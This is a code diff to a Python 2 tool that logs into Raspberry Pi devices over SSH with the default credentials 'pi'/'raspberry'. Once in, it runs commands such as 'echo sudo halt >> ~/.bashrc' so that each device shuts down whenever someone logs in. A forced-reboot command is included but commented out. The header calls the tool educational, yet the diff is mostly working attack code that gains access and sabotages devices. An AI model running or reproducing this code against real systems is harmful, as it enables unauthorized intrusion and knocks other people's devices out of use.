@@ -16,7 +16,7 @@ Note: This is a noisy tool that should be used for educational purposes only.
 
 import netaddr
 import argparse
-from sys import stdout
+import paramiko
 from socket import socket
 from scapy.all import *
 
@@ -44,16 +44,19 @@ DEFAULT_USER = 'pi'
 DEFAULT_PASS = 'raspberry'
 DEFAULT_SSH_PORT = 22
 LOG = 'logs/{{{}}}.log'
+CORRUPT_STARTUP_FILE_1 = "sed -i \'4i\\\'$\'\\n\'\'sudo halt\'$\'\\n\' ~/.bashrc"
+CORRUPT_STARTUP_FILE_2 = "echo sudo halt >> ~/.bashrc"
+FORCE_REBOOT = "sudo reboot -f"
+
 logger = logging.getLogger()
 
 
 #   print_intro()
 #
 #   Prints the introduction page to the program, including a small summary of actions that will be performed.
-def print_intro(input):
+def print_intro():
     print ART_AND_TITLE
     print DESCRIPTION
-    # TODO PRINT SUMMARY
 
 
 #   start_logging()
@@ -121,7 +124,7 @@ def check_host_up(address):
     return True
 
 
-def check_ssh_up(address, port, **kwargs):
+def check_ssh_up(address, port):
     logging.info('Checking if SSH service is running on host')
     buffer_size = 1024
 
@@ -148,18 +151,38 @@ def check_ssh_up(address, port, **kwargs):
 # Check if ssh is up, and if so, try to ssh into host
 def ssh_into_host(address, **kwargs):
     if 'port' in kwargs:
-        check_ssh_up(address, kwargs['port'])
+        port = kwargs['port']
     else:
-        check_ssh_up(address, DEFAULT_SSH_PORT)
+        port = DEFAULT_SSH_PORT
 
-    credentials = DEFAULT_USER + ":" + DEFAULT_PASS
-    if 'user_filename' in kwargs and 'password_filename' in kwargs:
-        usernames = readFile(kwargs['user_filename'])
-        password = readFile(kwargs['password_filename'])
-        credentials_list = match_userpass(usernames, password)
-        # TODO handle user-supplied credential files
-    # TODO actually ssh
+        check_ssh_up(address, port)
 
+    try:
+        ssh_client = paramiko.SSHClient()
+        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh_client.connect(address, port=port, username=DEFAULT_USER, password=DEFAULT_PASS, look_for_keys=False)
+    except paramiko.ssh_exception.AuthenticationException as e:
+        logger.info(e)
+        logger.info('Could not authenticate to target machine. Possible invalid credentials.')
+        logger.info('Exiting...')
+        exit(1)
+    except paramiko.ssh_exception.BadHostKeyException as e:
+        logger.info(e)
+        logger.info('Could not verify target machine host key.')
+        logger.info('Exiting...')
+        exit(1)
+
+    return ssh_client
+
+
+def corrupt_startup(ssh_client):
+    stdin, stdout, stderr = ssh_client.exec_command(CORRUPT_STARTUP_FILE_1)
+    stdin, stdout, stderr = ssh_client.exec_command(CORRUPT_STARTUP_FILE_2)
+    print stdout.read()
+    # stdin, stdout, stderr = ssh_client.exec_command(CORRUPT_STARTUP_FILE_3)
+    # stdin, stdout, stderr = ssh_client.exec_command(FORCE_REBOOT)
+
+    print stdout.read()
 
 
 def main():
@@ -178,7 +201,9 @@ def main():
             logging.info('Exiting program...')
             exit(1)
 
-        ssh_into_host(host)
+        client = ssh_into_host(host)
+        corrupt_startup(client)
+        client.close()
 
     logging.info('Execution done')
 
